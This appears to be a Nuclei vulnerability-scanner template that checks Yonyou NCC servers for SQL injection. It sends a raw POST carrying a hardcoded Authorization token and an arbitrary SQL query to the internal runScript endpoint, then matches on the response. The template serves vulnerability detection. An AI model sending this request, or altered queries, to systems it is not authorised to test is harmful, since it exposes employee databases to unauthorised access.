id: yonyou-ncc-runScript-sqli

info:
  name: yonyou-ncc-runScript-sqli
  author: HuanXiong
  severity: high
  description: |-
    
  reference:
    - 
  tags: SQL Injection

http:
  - raw:
      - |
        POST /ncchr/attendScript/internal/runScript HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
        Content-Length: 42
        Accept: */*
        Accept-Encoding: gzip
        Accept-Language: en
        Authorization: 58e00466213416018d01d15de83b0198
        Connection: close
        Content-Type: application/x-www-form-urlencoded

        key=1&script=select id from hi_psndoc_cert

    matchers:
      - type: dsl
        name: SQL注入
        dsl:
          - "status_code==200 && contains_all(body,'ID')"
